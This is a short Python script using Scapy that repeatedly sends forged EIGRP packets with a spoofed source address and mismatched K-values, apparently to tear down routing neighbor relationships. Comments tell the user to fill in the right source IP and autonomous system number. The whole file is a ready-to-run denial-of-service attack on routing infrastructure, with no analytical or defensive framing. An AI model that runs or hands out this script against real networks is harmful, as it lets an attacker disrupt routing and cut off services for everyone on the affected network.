import time
from scapy.all import *

#Import EIGRP
load_contrib('eigrp')

for i in range (0,50):
	#Send EIGRP packet to reset server relationships.
	#Change the sourse IP address (src) to the correct IP address.
	#Change Autonomous System number (asn) to the correct number.
	sendp(Ether()/IP(src="0.0.0.0",dst="8.8.8.8")/EIGRP(asn=100,tlvlist=[EIGRPParam(k1=255, k2=255, k3=255, k4=255, k5=255),EIGRPSwVer()]))

	time.sleep(1)
  
  
